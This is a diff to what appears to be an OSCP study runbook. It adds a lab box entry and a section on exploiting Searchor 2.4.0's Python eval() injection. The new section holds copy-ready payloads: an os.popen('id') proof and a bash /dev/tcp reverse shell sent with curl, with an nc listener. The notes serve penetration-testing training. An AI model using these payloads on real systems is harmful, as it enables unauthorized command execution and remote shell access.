@@ -922,6 +922,7 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- Windows XXE file read followed by SSH-key extraction
 - [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- HFS 2.3 command injection and callback staging
 - [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- OpenAM JATO deserialization after application and version enumeration
+- [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]] -- Searchor Python eval injection, source-driven query review, and credential pivot to SSH
 - [[OSCP/BOXES/WRITE UPS/Linux/Pelican|Pelican]] -- unauthenticated Exhibitor configuration command injection and callback delivery
 - [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- WordPress REST disclosure, plugin JAR analysis, and slow-response timing triage
 - [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- staging virtual-host routing, URL-scanner SSRF to loopback, and authenticated Voting System upload
@@ -1008,3 +1009,30 @@ curl --max-time 10 -fsS \
 `zerodiumsystem()` is evaluated by the compromised PHP build. Treat the header as a command-execution primitive, not as a normal application parameter, and move to [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]] after the identity proof.
 
 **Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]].
+
+## Searchor 2.4.0 Python `eval()` injection
+
+When a Searchor-style application builds an expression around the query value, use the query parameter as a Python expression boundary. Prove execution with `id` before delivering a callback.
+
+```bash
+boxset SearchorPayload "test'),__import__('os').popen('id').read()#"
+curl -fsS -G "http://$FQDN:$WebPort/" \
+  --data-urlencode "engine=Accuweather" \
+  --data-urlencode "query=$SearchorPayload" \
+  | tee "$BoxDir/loot/searchor-id-proof.txt"
+```
+
+For a confirmed callback, keep the listener separate and reuse the same encoded parameter:
+
+```bash
+nc -lvnp "$Lport"
+boxset Callback "bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'"
+boxset SearchorPayload "test'),__import__('os').system('$Callback')#"
+curl --max-time 10 -fsS -G "http://$FQDN:$WebPort/" \
+  --data-urlencode "engine=Accuweather" \
+  --data-urlencode "query=$SearchorPayload" >/dev/null
+```
+
+The first quote closes the application string, `__import__('os')` reaches the standard library without an import statement, `popen('id').read()` returns proof in the HTTP response, and `#` comments the original expression tail. Keep the payload variableized because raw URL construction changes quoting. If the direct callback is unreliable, validate the recovered credential against the identified SSH account once and continue from a stable session.
+
+**Seen in:** [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]].
